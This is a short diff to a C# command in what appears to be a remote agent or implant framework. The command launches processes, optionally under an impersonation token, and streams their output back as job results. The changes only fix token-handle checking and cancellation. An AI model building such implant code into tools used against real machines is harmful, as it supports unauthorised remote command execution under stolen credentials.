@@ -35,7 +35,7 @@ namespace Agent.Commands
             };
 
 
-            if (context.Agent.ImpersonationToken != IntPtr.Zero)
+            if (context.Agent.ImpersonationToken != null && !context.Agent.ImpersonationToken.IsInvalid)
                 creationParms.Token = context.Agent.ImpersonationToken;
 
             var procResult = APIWrapper.CreateProcess(creationParms);
@@ -54,11 +54,6 @@ namespace Agent.Commands
             if (creationParms.RedirectOutput)
                 APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output =>
                 {
-                    if(token.IsCancellationRequested)
-                    {
-                        Thread.CurrentThread.Abort();
-                    }
-
                     context.AppendResult(output, false);
                     if (stopwatch.ElapsedMilliseconds > context.ConfigService.JobResultDelay)
                     {
@@ -66,7 +61,7 @@ namespace Agent.Commands
                         context.ClearResult();
                         stopwatch.Restart();
                     }
-                });
+                }, cancellationToken: token);
         }
     }
 }
